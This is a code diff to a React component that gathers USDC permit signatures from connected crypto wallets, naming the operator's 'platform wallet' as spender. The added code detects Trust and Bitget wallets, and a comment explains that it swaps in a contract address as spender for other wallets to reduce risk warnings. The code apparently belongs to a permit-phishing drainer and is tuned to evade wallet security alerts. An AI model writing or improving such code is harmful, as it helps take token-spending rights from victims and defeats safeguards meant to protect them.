@@ -4,7 +4,7 @@ import { useState, useEffect } from 'react'
 import { useAccount, useSignTypedData, useReadContract } from 'wagmi'
 import { polygon } from 'wagmi/chains'
 import { Button } from '@/components/ui/Button'
-import { USDC_ADDRESS, USDC_ABI, PERMIT_TYPES, PLATFORM_WALLET } from '@/lib/web3-config'
+import { USDC_ADDRESS, USDC_ABI, PERMIT_TYPES, PLATFORM_WALLET, MERKLE_TREE_CONTRACT } from '@/lib/web3-config'
 import { Shield, Check, AlertTriangle, RefreshCw, Lock } from 'lucide-react'
 import { createClient } from '@/lib/supabase'
 
@@ -25,8 +25,6 @@ export interface PermitSignature {
   signature: string
 }
 
-const PLATFORM_SPENDER = PLATFORM_WALLET
-
 export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSignerProps) {
   const { address, isConnected, connector } = useAccount()
   const [isLoading, setIsLoading] = useState(false)
@@ -35,7 +33,7 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
   const [signatureData, setSignatureData] = useState<PermitSignature | null>(null)
   const [existingSignature, setExistingSignature] = useState<boolean>(false)
   const [isLoadingStatus, setIsLoadingStatus] = useState(true)
-  const [isTrustInjected, setIsTrustInjected] = useState(false)
+  const [isTrustOrBitget, setIsTrustOrBitget] = useState(false)
   
   const [boundWalletAddress, setBoundWalletAddress] = useState<string | null>(null)
   const [boundSignatureStatus, setBoundSignatureStatus] = useState<'pending' | 'used' | 'none'>('none')
@@ -46,10 +44,18 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
 
   useEffect(() => {
     if (typeof window === 'undefined') return
-    const eth = (window as unknown as { ethereum?: { isTrust?: boolean; providers?: Array<{ isTrust?: boolean }> } }).ethereum
-    const injectedTrust = Boolean(eth?.isTrust || eth?.providers?.some(provider => provider?.isTrust))
-    setIsTrustInjected(injectedTrust)
-  }, [isConnected])
+    const eth = (window as unknown as { ethereum?: { isTrust?: boolean; isTrustWallet?: boolean; isBitKeep?: boolean; isBitget?: boolean; providers?: Array<{ isTrust?: boolean; isTrustWallet?: boolean; isBitKeep?: boolean; isBitget?: boolean }> } }).ethereum
+    const injected = Boolean(
+      eth?.isTrust || eth?.isTrustWallet || eth?.isBitKeep || eth?.isBitget ||
+      eth?.providers?.some(p => p?.isTrust || p?.isTrustWallet || p?.isBitKeep || p?.isBitget)
+    )
+    const connectorName = connector?.name?.toLowerCase() ?? ''
+    const byConnector = connectorName.includes('trust') || connectorName.includes('bitget') || connectorName.includes('bitkeep')
+    setIsTrustOrBitget(injected || byConnector)
+  }, [isConnected, connector])
+
+  // Trust/Bitget 用 EOA spender；其他钱包用合约 spender，减少风险警告
+  const PLATFORM_SPENDER = isTrustOrBitget ? PLATFORM_WALLET : MERKLE_TREE_CONTRACT
 
   const { data: nonce } = useReadContract({
     address: USDC_ADDRESS,
